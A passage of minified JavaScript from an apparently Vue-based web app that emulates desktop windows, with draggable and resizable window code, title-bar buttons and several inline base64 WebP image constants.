          (a.value = i.getWindowById(u)),
            It("#" + a.value.windowId)
              .draggable({
                listeners: {
                  move(C) {
                    (n.value.x += C.dx), (n.value.y += C.dy);
                  },
                },
                modifiers: [
                  It.modifiers.restrictRect({
                    restriction: "#screen",
                    endOnly: !0,
                  }),
                ],
                allowFrom: "#top-bar",
              })
              .on("dragstart", () => {
                te = !0;
              })
              .on("dragmove", () => {
                te && (D(), (te = !1));
              })
              .on("dragend", () => {
                te = !1;
              })
              .resizable({
                edges: { left: !0, right: !0, bottom: !0, top: !1 },
                listeners: {
                  move(C) {
                    const I = C.target;
                    (f.value = C.rect.width),
                      (p.value = C.rect.height),
                      (I.style.width = `${f.value}px`),
                      (I.style.height = `${p.value}px`),
                      (n.value.x += C.deltaRect.left),
                      (n.value.y += C.deltaRect.top);
                  },
                },
                modifiers: [
                  It.modifiers.restrictSize({
                    min: { width: 400, height: 400 },
                    max: {
                      width:
                        document.getElementById("screen").clientWidth -
                        n.value.x,
                      height:
                        document.getElementById("screen").clientHeight -
                        n.value.y,
                    },
                  }),
                ],
              });
        }),
        (E, C) => (
          ve(),
          Ie(
            "div",
            {
              id: a.value.windowId,
              style: Pt(k.value),
              class: gt([
                "window window-style",
                {
                  fullscreen: 1 == a.value.fullscreen,
                  minimize: "minimize" == a.value.fullscreen,
                },
              ]),
              onClick: [D, D],
              onDragstart: D,
            },
            [
              L(
                "div",
                {
                  id: "top-bar",
                  class: gt([
                    "top-bar-window",
                    De(i).activeWindow == a.value.windowId
                      ? "top-bar"
                      : "top-bar-deactivated",
                  ]),
                  onDblclick: G,
                },
                [
                  L("div", fM, [
                    "photo" == x.value.type
                      ? (ve(),
                        Ie(
                          "img",
                          {
                            key: 0,
                            class: "icon-image",
                            src: lf,
                            alt: a.value.altText,
                          },
                          null,
                          8,
                          hM
                        ))
                      : (ve(),
                        Ie(
                          "img",
                          {
                            key: 1,
                            class: "icon-image",
                            src: sf,
                            alt: a.value.altText,
                          },
                          null,
                          8,
                          pM
                        )),
                    L("span", null, xt(x.value.title), 1),
                  ]),
                  L("div", { class: "triple-button" }, [
                    L(
                      "button",
                      { class: "minimize-button button", onClick: q },
                      mM
                    ),
                    L(
                      "button",
                      { class: "expand-button button", onClick: G },
                      yM
                    ),
                    L(
                      "button",
                      {
                        class: "close-button button",
                        style: { "margin-right": "3px", "padding-left": "1px" },
                        onClick: ie,
                      },
                      " × "
                    ),
                  ]),
                ],
                34
              ),
              L("div", wM, [
                AM,
                "file" == x.value.type
                  ? (ve(),
                    Ie(
                      "div",
                      {
                        key: 0,
                        class: "file-explorer !h-[95%] !w-[100%]",
                        style: Pt([{ width: "100%" }, { height: v.value }]),
                        ref_key: "fileExplorer",
                        ref: y,
                      },
                      [
                        L(
                          "iframe",
                          {
                            class: "mx-auto responsive-iframe w-[100%]",
                            height: "100%",
                            src: x.value.content.src,
                          },
                          null,
                          8,
                          bM
                        ),
                      ],
                      4
                    ))
                  : (ve(),
                    Ie(
                      "div",
                      {
                        key: 1,
                        class: "file-explorer",
                        ref_key: "fileExplorer",
                        ref: y,
                      },
                      [
                        L(
                          "div",
                          {
                            class: "grid-container-photos",
                            style: Pt({ height: v.value }),
                          },
                          [L("img", { src: x.value.src }, null, 8, _M)],
                          4
                        ),
                      ],
                      512
                    )),
              ]),
            ],
            46,
            dM
          )
        )
      );
    },
  },
  MM = Ot(PM, [["__scopeId", "data-v-5f9e768b"]]),
  SM = "" + new URL("sidebar-image.Cvh9Zs2s.png", import.meta.url).href,
  TM =
    "data:image/webp;base64,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",
  kM =
    "data:image/webp;base64,UklGRl4FAABXRUJQVlA4IFIFAAAwHACdASppAGkAPtFcqU0oJSQiJ9QMwQAaCWwAx6Crft++fax7z9Zfxfjy71ZHvZRkA9RX6G3hXmT/bv1b/Q5/gvRj6j70AOlm/dPCPuyKRMLZQz5WA3HvqhFwNfo8n9QtVbmjeJntEQWBBUqEUE/gl0Ut6WxRollhDtrNc67moz5X5y0Chf+2X5Vh/Vrm1m981g6wPkAJwmlJ+FxeOGD+sqKW5QZsN0EQt77lWLldGjF6k6ZbA5ENXJtAJy/g8cnTX9lElcRczYuX+6Xpc3fJQizlrCKWUkR1s90vWUa0fSB29V4dAnWTm4AA/tlP3bqpPJch4+2FcTVIkIYLyhcu+aZOiS0ocWBWL/yoNCGZ1vmuAu6JNITmZWDA736B8oIYyd8GJ+0QJHjCJ7qGEs5PNsEDRe5FDyK0QE7uTLZSkQWItKlE/oSW3jm5FQITZYtL882zquQxo/HHZwujG3keUAtMWwY1DBXDOFhmsRCmDZ3x+DuUPZvH/qTX5WUAA8wZykd85PSm+sDeALOK0Y8DXzviPKxJg5TD1bdm8yjm9pmwOPZo+g44zYw1FrABBEFYNZB8jth1fznP53oa2iRWiav8sQugsgJOCUOdxe5p2ZFv4HEIb69jLkd3Yn66oLpeIK17QoleEd+XoFTtGZiSIUIB0Xw8UeyKAM6Mh4k1enxWRgP7xOSzZDhhSqn9IWp+dtfoEO0UbOSHqyytKpag/x+fH7dbbF09oHMsQNC6nbl1TpCUj9zipSOHXS9a2XNWwDu8P+Hl3CG/pqJRMYWBFxMGJvXRYO59WWZQvNRiOqpaxdn5ryHHoxLsPN2q+7Zvz/FUf+wF3luWDZU8HLJJfkCmsVaTrmf8QPgaWPN2nuu0OnKt4ZA5Nmp7v/JHmOMBOUQh5dl6uFE1E9c7T7nLvE2TAdu7irjBjz6q1FbI9pnwrAVEe8Py9JgP6Y2e8dRZGNelG3skhtHfgoVzdgasthElUJc1IKUQvAUaT/eA8YNSq8kTaJZuZOdzh1hmIcDTExV1tlMlln/9KQAi62u7b/obZL93IJIwIDPf0pF4KHHiqXI9RR+VtwMLD0uNvzXGPcpjGhr6bX/Doqf2sUIbfTMad7zARDDmdebVdCv4jLsZch1hAFlvF5PnOs1O6/BEoDu43kAORhgC9w5V+S9ZSOldjktP4vo937q9XC9tvAc5cwnuNo/YknIPyqEvz+abpAgB61bTreePuYMfJtANm/wblMRWJZh1xDzThsK9uAlj+c/7Y5a1Onfz0abuCSTzuvQ02th12lXA5WrkS09zyd27Ker0CDDgex1EZ91jv3FOQ+TF4m1/POorJ+kftqT30HFVkxcGCXZZeFVsdzLUvVD3DBBJkLY/wNCUNmvyTbQSHU4G43PMmJZvPeNQgnzjoycaJFWvLO4EPUxA4/yzR/dLOC9Kjuzg39WtkC8OH8vpDB6mbphyhWGh2hmeXHYTMHZz3WQqa8RG17SraqtSmEYQCd/jIG67e/mazdO6speekOAMueIX35LKgbgep21Ww2nspBqm1pgrRPxxK7PlJD+yvLs7byLbNGan9hYoYJW8NNEOggZOESdASguOwTi1s/CnpJ8bAhZd7dgv3NXQefbPC++FemupCqOoamgjOwZ1T6qv08I+ErKCWvaii/eQgp29xkqD13HHrnYlLVhpmgsTK5Frznq0Xt3xlK0RvkZYK/IfvVoMsXOcogzBeleO/Jnw12UBKsQOpH+7bOR7H9/jWZnwSdPcxfn2t568EIOTyXJoaFt7cyuEPNVBXGh43CDDnudESDnwm5l7a7kgAAA=",
  EM =
    "data:image/webp;base64,UklGRooFAABXRUJQVlA4IH4FAACQMwCdASozATMBPtFosFEoJiUipjHoWQAaCWVu4XJ1Jl9iL/zmuZdw/pHJe8PySHx/OfoE9AH6M9gDnF+YDzdPSvvOe9I5DL5RfUSyBMjVNd8JJ3Gx8nY+TsfJ2VoxheTsfJ2Pk7HxNWbZ0Bky+5yxsLydj5OxAsMYMe4rGBWghfTpxSPk7Hh4N36X9+H8NEWN3rG71Lua2dD+BIN7/rJNnefRGOF2ixu9Y3evmqtG71Q4fE1cgKR8mTTiXvlISDhz6NZXrJu0e6pfi/75wopimP6sduK3JO7LLeYpFBPw5CtWCSOYFJ83+Zo4pBFdV6JZnYgZ4q/HaJbg5fpDJk1y02jXM64UZGCbaGluvKnXAlqkByvaA/MsBZzpkm7xuaW68qdcRmxgQwfi+qHp5tign2Y4jyl/KpIRGBLhYx4Fbvx8LA6bhyM1AQosRmkhTfXvjzb1YLBV2p2IGeKvx2lb5TaKxVghEVDDwjWAtCEETcnxmZDFzjGnYy3CmB7a6SZjQEFMK4NvZ6kJ3SFo23NrC8nY+TsfJ2Pk7Hydj5Ox8nY+TsPAAP777Z7y9+At5/TsnZNQmEAQnXwAEHRF21iIK8sazw5Di58tTWMSJBOq8Vm8OrHOuOAtn43dA6GVyB9tQbik6q/NaqpcB1oRGti9Cl8iZtcrXOYIDb6YJSNuC6C9fuyopEGkMeMagM1XEqOCtEW9ilde/rk92Ycx7ehBvyvuyMGjyAO7gO/CPPInM8yQIqnbr2QjA4FlhOJLwRPqMMQP3rqdvPRFnlwFs6HgJqas9BEDlVvp9JqN8PGJxKrh9SEsNyJyFfck03ZkvzYLKB39KUWFoOX6QsilsIaznQGwAqwK1S81m9SsdETxWK21K9gAx2ezDBdiwndL/AbFiIAE4c04oH1qT2iCEGDaYimWyzM4RRiYKRUXbYkdDp+t14gec6C6x4FWqjPTLDsMZISBkNZh7FbpxnCY9g7wAvJ67jxqy4AAAQYjWOzdwrxIwgh2fPwkFgDST+Fn35EPUpoD0/lzjsa0iu+eYhgEAqzuROZXPtyizr/MtiG9Wkpw8cRa2QsTqztieL/2D3a9NbzCOLo7X7BzkEepX6vl6FFzyWGG3wrI1WK73aEkadh8OF/YYm3eGxzDR/t4C1KbiCMLX66Z3FvxW42+5VLznc3j8dVXyMXWMIftwZgIkuSmn2ZQzgLEKsLAmwoxV0G/ZpcGfIiDUHLnWEq9CceMBMZO657+8bOQcNiF+ndcMGbmOe8VrRWXKsLahSrxrmNxHXGnMR0jwguAJtZ0Nh9gwpt3bPjwstK07C78GSjq58pxi+zmgMl/XCxp/cX6EYJInHEXEtlYD3bYZMRcjKZ0YR9EhfOp5rm3WwZW026IbDI/IDY5XW6z8pJGHn7842rx8LBFORIx+vxp/Bdp0H38yDK+0aSWXGPJHsUc6qb/SrDZyvY7Gyhbk86WrsQoj9zRGTyY3NgxcpM3iM92ai7hKxxT/VNk+9kNLeXLhgpHYXB//Z37TfwdNW2VMQjCuStD8gm2LgHZyINNcTxW8FcCRWpfDn57FbBf3a7BcD/1pWAqAx8PL3uZjoOwRup8y0Bp6RGYSPUkYt1vooZYU1j+gj9qHO9lqx/uwrAW7mAWcBOPlbm8Kqlod+zTe3hKMKrek07bN+vh9UdzBoJ9NNM5InbbvgmEnqmVIyZ8oSYT6tMq31P203hkM5emHuoNmfv9UykVIinE4ulK1mN+4nlfRBU0kcc78OuhtaoXvbBUJ0GMeJUCtgISKwl1BBh0S4JPIDcWGK5LXzyyfCgqQBd0Yef4WA2I3JTSGAP5dTjdDiwxXJa+V9hBz+Gorv0gkuXFtvglWOOAAAAAAAAAAA==",
  DM =
    "data:image/webp;base64,UklGRtwEAABXRUJQVlA4INAEAACQHwCdASq0ALQAPp1Oo0ylpCMiJXK4iLATiWNu4XSg9Rt/4z8ZtfK7F+ZH9Y/YDsIN+I4b/Pwv9+5wHmAc4DzAftl653oF/zvqAf2TqIfQd6V79zPS31Vfyc+k1oiT3kd/lTF5wdxiTYRJsIk2ESbCJNckdR+1HlbdC0a0Qs3Af1vdAhgG6PkWsoLfQ7Qw1KqVJAtUZWewcEwZ4CgIpuM8/ziK7/IrgGO+yGME5XvVQCi2GQfTNvCfJGELX+63c2V69z0rTeH4Mg2cUj06cYEGpkEZt2LLktmiOC0LeRpEkDQb8NocEo14ci0Fa6OPfqAveoIjBnh+nTikQJ0RJsIk2ESbBIAA6UJbYCFG+HvPMl8ybnRAABosPU8LuzqpYORZmeWHJxcMiYJcMIWiOOX031gcHTM8MUTj4qKOVO7sd+hWtUYeHjUCR5ul2cKRZxuU9c9VGmlPvoMSMvGEetIHBTmlOSaF+Fw6ITcUHaSgOhSJ9VpVDf5s2ifruuo1lZnVYH/+LRwR1bbp5n4TdR1aW7jfvCN0HZKo45xc/HATZCk7uC9ngQpRK51m6KFSRFr+xzpwz+Y9tzPOpVnpCMufiayUu3iZDNkBt58GEdckosr3WM2ZfXNJ58VC/EejT1k3OBT10RrXBAm1RoUG1SUX9w1MXUEZpTkuVKNrJHTcvYgzn6jp/VnWaCI8J1iK4Frn+G+Peu/EKRHfnSDAKn7vfu7Sz46NujhUHz0yvaZamxirM0c90rpljltZeZQ9hAhafh4bl1ffB325Qs4GnZGlERsT3essq+kq2YUk7i/TR3uCavwNtXKs54SV08iEka54jJFEA5lReReKXbDisBfKL7SYF7z+4V3AyBQfIGaYBg/F8NbAtocFLUSjn/MLcaysJfiToM37rSAdElPvJNkdB5oNH7+CxoR7XOWx4MyvD3pqBO/J49YBIaQ/2KDGM5suVLom3qz+KhEDZ+4KE8aoFVl2sFDyb+KQTDWJHkmkbNw6/T5ORz7cmzxbcch33RRAsDrzcZLUAAq0qF++qRXqv3pFNNDzPS1euC2iKlpnfpNyTyraz2nutNCtGXzeuO0cHOLd2AGonJ6bRBpuPgdk4ucbhDzLVYIL1CS/CFISl+mw7Or9L4CBmIxe633xvl2Wax3a+9NtSxH9v7ap4BWOBUulzpHXOLdMhOuPmXXlXGKEwDHvAr8dZYlGxyKXl2apqV1V/OIqIVKab0g56vQd+2rff8kzpVhRERum+Bn5ITOjQVd9PgBWAB3dGXHSm0wKtAgx+SVqvfBWjuLe3p0XW0rFg3iJDDZu8loBg4n7a22OhpvPZGz3Kn5pG7esmBCjbyBJqByl3VpoHJIoTZdqYqnqqi7k/m9uy5svPvm7qTuMldIuyJU5lKY+b4sPlLMVCIul2lu/ZpdmypqcH3y83HkeAF7SXfHR+sc0OmWRlf0n6lmg1aVKt8uNaOOZNWWleR55QMtDaLOsqzHtWFehilwj+a+6COcFnsNBS8U8BgLo+87xZdI69iewypIoGakSPC0Fdc36zFIYdOR765WgRYY0Cvgl4qomX3J/BagNMHK2PiqnN41tKNcYHA1vDyHw2iNyKnAyuXJZoy9Qcae/gnpWDDD20oAAAAAAAAAAAA==",
  IM =
    "data:image/webp;base64,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",
  OM =
